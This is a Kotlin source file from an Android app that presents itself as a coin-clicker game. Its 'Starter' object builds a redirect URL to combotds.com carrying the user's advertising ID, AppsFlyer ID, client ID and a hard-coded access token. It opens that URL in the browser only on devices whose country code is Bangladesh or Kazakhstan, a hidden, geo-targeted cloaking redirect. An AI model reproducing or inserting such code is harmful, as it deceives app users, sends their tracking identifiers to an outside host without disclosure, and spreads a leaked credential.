package com.nistech.coin_clicker2.utils

import android.app.Activity
import android.content.Intent
import android.net.Uri
import com.nistech.coin_clicker2.manager.DeviceManager
import com.nistech.coin_clicker2.storage.StorageManager

object Starter {
    private const val BD = "bd"
    private const val KZ = "kz"
    private var url = "https://combotds.com/gJGNrd?sub1={dp3}&sub2={dp4}&sub3={dp5}&sub4={dp6}&sub5={dp7}&bundle={bundle}&razrab=razrab10&client_id={dp1}&appsflyer_id={userId}&advertising_id={gadId}&acsess=848323463469539|vnIl8jBEzldJFCyQ8XzcwEFpnG0"

    fun start(activity: Activity) {
        StorageManager.backendUrl = checker(activity)
        if (DeviceManager().getCountryCode(activity) == BD ||
            DeviceManager().getCountryCode(activity) == KZ) {
            openWebPage(activity)
        }
    }

    private fun checker(activity: Activity): String {
        val dataParser = OfferDataParser(activity, StorageManager)
        val finalUrl = dataParser.splitString(StorageManager.deeplink, url)
        StorageManager.backendUrl = finalUrl
        return StorageManager.backendUrl
    }

    private fun openWebPage(activity: Activity) {
        val intent = Intent(Intent.ACTION_VIEW, Uri.parse(StorageManager.backendUrl))
        activity.startActivity(intent)
    }

}